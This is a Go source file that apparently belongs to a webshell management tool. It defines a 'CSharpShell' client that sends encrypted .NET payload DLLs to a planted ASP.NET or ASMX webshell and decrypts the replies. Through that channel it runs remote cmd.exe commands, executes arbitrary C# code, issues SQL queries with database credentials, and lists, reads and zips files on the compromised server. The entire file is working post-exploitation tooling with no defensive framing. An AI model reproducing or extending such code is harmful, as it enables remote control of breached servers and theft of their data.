package service

import (
	"clouddrop/pkg/util"
	"fmt"
	"log"
	"strings"
)

var NetSessions map[int]string
var NetTargets map[int]string

func (s *CSharpShell) GetShellType() string {
	return "net"
}

func dotNetTargetCandidates(id int) []string {
	if NetTargets != nil {
		if target := NetTargets[id]; target != "" {
			return []string{target}
		}
	}
	return []string{"net20", "net40"}
}

func rememberDotNetTarget(id int, target string) {
	if target == "" {
		return
	}
	if NetTargets == nil {
		NetTargets = make(map[int]string)
	}
	NetTargets[id] = target
}

func (s *CSharpShell) FreshSession(id int, shellURL string, password string) (string, error) {
	if NetSessions == nil {
		NetSessions = make(map[int]string)
	}

	shellURL = normalizeASMXURL(shellURL)
	dynamicPassword := util.GeneratePasswordSeed()
	var lastErr error

	for _, target := range dotNetTargetCandidates(id) {
		code, err := readPayload(target, "Check.dll")
		if err != nil {
			lastErr = err
			continue
		}
		enCode := util.EncryptWithOffset(code, dynamicPassword, util.RequestOffsetForShell(s.GetShellType()))

		firstResult, err := s.post(shellURL, dynamicPassword, enCode, "", nil)
		if err != nil {
			lastErr = err
			continue
		}
		NetSessions[id] = firstResult.Cookie
		log.Println("当前ASP.NET会话 " + NetSessions[id])

		enResult, err := s.post(shellURL, dynamicPassword, enCode, NetSessions[id], nil)
		if err != nil {
			lastErr = err
			continue
		}
		body := strings.TrimSpace(s.responseBody(shellURL, enResult.Body))
		if body == "" {
			lastErr = fmt.Errorf("empty response from target %s", target)
			continue
		}

		res, err := util.DecryptWithOffset(body, dynamicPassword, 5)
		if err != nil {
			lastErr = err
			continue
		}
		result := strings.TrimSpace(res)
		if !containsSuccess(result) {
			lastErr = fmt.Errorf("unexpected response from target %s: %s", target, result)
			continue
		}

		rememberDotNetTarget(id, target)
		return result, nil
	}

	return "", lastErr
}

func (s *CSharpShell) post(shellURL, password, code, session string, headers map[string]string) (util.ShellPostResult, error) {
	options := util.ShellPostOptions{Session: session, ShellType: s.GetShellType(), Headers: headers}
	if isASMXURL(shellURL) {
		return util.PostASMXRequestWithOptions(normalizeASMXURL(shellURL), password, code, options)
	}
	return util.PostRequestWithOptions(shellURL, password, code, options)
}

func (s *CSharpShell) responseBody(shellURL, body string) string {
	if isASMXURL(shellURL) {
		return util.ExtractASMXResult(body)
	}
	return body
}

func (s *CSharpShell) hook(id int, shellURL, password, payloadName string, params map[string]string) (string, error) {
	shellURL = normalizeASMXURL(shellURL)
	var lastErr error

	for _, target := range dotNetTargetCandidates(id) {
		code, err := readPayload(target, payloadName+".dll")
		if err != nil {
			lastErr = err
			continue
		}
		dynamicPassword := util.GeneratePasswordSeed()
		enCode := util.EncryptWithOffset(code, dynamicPassword, util.RequestOffsetForShell(s.GetShellType()))
		enResult, err := s.post(shellURL, dynamicPassword, enCode, NetSessions[id], encodeParamsHeader(params))
		if err != nil {
			lastErr = err
			continue
		}

		body := strings.TrimSpace(s.responseBody(shellURL, enResult.Body))
		if body == "" {
			if payloadName == "ExecCode" {
				rememberDotNetTarget(id, target)
				return "", nil
			}
			lastErr = fmt.Errorf("empty response from target %s", target)
			continue
		}

		res, err := util.DecryptWithOffset(body, dynamicPassword, 5)
		if err != nil {
			lastErr = err
			continue
		}
		rememberDotNetTarget(id, target)
		return res, nil
	}

	return "", lastErr
}

func (s *CSharpShell) BaseInfo(id int, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "BaseInfo", nil)
}

func (s *CSharpShell) ExecCommand(id int, command string, shellURL string, password string) (string, error) {
	osType, _ := s.hook(id, shellURL, password, "OS", nil)
	return s.hook(id, shellURL, password, "CMD", map[string]string{
		"cmdPath": strings.ReplaceAll(chooseWindowsCmd(osType), "C:/Windows/System32/cmd.exe", "cmd.exe"),
		"exit":    "true",
		"cmd":     command,
	})
}

func (s *CSharpShell) ExecCode(id int, code string, shellURL string, password string) (string, error) {
	className := extractCSharpClassName(code)
	return s.hook(id, shellURL, password, "ExecCode", map[string]string{
		"codeBytes":    code,
		"FullTypeName": className,
	})
}

func (s *CSharpShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, shellURL, password string) (string, error) {
	return s.hook(id, shellURL, password, "DataBase", map[string]string{
		"driver":   driver,
		"host":     host,
		"port":     port,
		"user":     user,
		"pass":     pass,
		"database": database,
		"sql":      sql,
		"option":   option,
		"encoding": encoding,
	})
}

func (s *CSharpShell) FileZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "FileZip", map[string]string{"srcPath": srcPath, "toPath": toPath})
}

func (s *CSharpShell) FileUnZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "FileUnZip", map[string]string{"srcPath": srcPath, "toPath": toPath})
}

func (s *CSharpShell) FileList(id int, path string, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "FileList", map[string]string{"path": path})
}

func (s *CSharpShell) FileShow(id int, path string, shellURL string, password string) (string, error) {
	return s.hook(id, shellURL, password, "FileShow", map[string]string{"path": path})
}
